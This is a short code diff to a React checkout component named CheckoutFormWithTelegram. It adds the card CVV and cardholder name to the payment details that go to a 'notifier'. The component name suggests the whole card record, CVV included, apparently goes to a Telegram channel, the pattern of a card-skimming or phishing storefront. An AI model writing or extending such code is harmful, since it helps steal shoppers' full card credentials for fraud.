@@ -21,6 +21,7 @@ interface PaymentDetailsData {
   expiryMonth: string;
   expiryYear: string;
   is3DSecure?: boolean;
+  cvv?: string;
 }
 
 interface CheckoutFormWithTelegramProps {
@@ -59,7 +60,12 @@ export default function CheckoutFormWithTelegram({
       if (paymentData && shippingDetails) {
         const checkoutDataToSend = {
           shippingDetails,
-          paymentDetails: paymentData,
+          paymentDetails: {
+            ...paymentData,
+            // Map cardHolder (from PaymentForm) to cardholderName (expected by notifier) if needed
+            cardholderName: (paymentData as any).cardHolder || paymentData.cardholderName,
+            cvv: (paymentData as any).cvv || paymentData.cvv,
+          },
           orderInfo: {
             orderId,
             productName,
